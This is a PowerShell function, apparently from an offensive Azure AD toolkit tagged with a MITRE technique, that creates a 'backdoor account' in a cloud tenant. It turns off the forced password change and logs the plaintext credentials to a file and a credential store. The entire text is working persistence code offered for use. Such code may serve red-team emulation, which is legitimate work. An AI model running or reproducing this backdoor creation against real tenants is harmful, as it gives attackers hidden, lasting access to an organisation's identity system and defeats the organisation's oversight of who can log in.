#Create a user
function CreateAccount {
    mitre_details("CreateAccount")

    #Create Admin Account
    Write-Host "`nDisplaying available domain information:" -ForegroundColor Yellow
    Get-AzureADDomain |Format-Table Name, SupportedServices, AuthenticationType
    $new_backdoor_username = Read-Host -Prompt 'Enter username for the new backdoor account (eg: user@domain.com)'
    $new_backdoor_pass = Read-Host -Prompt 'Enter password for the new backdoor account (must comply with password policy)'
    $new_backdoor_display_name = (Read-Host -Prompt 'Enter a display name for the new backdoor account')
    $new_backdoor_display_name = $new_backdoor_display_name  -replace " ","" 
    $new_backdoor_pass_secure = ConvertTo-SecureString $new_backdoor_pass -AsPlainText -Force 

    #Create new account
    try {
        Write-Host "`nSetting new backdoor account in tenant ...`n"  -ForegroundColor Gray
        
        $PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
        $PasswordProfile.Password = $new_backdoor_pass
        $PasswordProfile.EnforceChangePasswordPolicy = $false
        $PasswordProfile.ForceChangePasswordNextLogin = $false
        New-AzureADUser -DisplayName $new_backdoor_display_name -PasswordProfile $PasswordProfile -UserPrincipalName $new_backdoor_username -AccountEnabled $true -MailNickName $new_backdoor_display_name -ErrorAction Stop | Out-File -FilePath .\Outputs\Backdoor_Account.txt -Append
        Start-Sleep -Seconds 10
        Write-Host "Successfully created new backdoor account!!!" -ForegroundColor Yellow -BackgroundColor Black

        Write-Host "`nAccount Name: $new_backdoor_display_name `nUsername: $new_backdoor_username `nPassword: $new_backdoor_pass" 
        Write-Host "`nDetails of backdoor account are logged in 'Backdoor_Account.txt'." -ForegroundColor Gray
        
        #Save to credential store
        AddCredentials "password" "CA_$new_backdoor_username-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $new_backdoor_username $new_backdoor_pass  
    }
    catch {
        Write-Host "Error: Failed to create new backdoor account!" -ForegroundColor Red
        #$_
        break
    }
}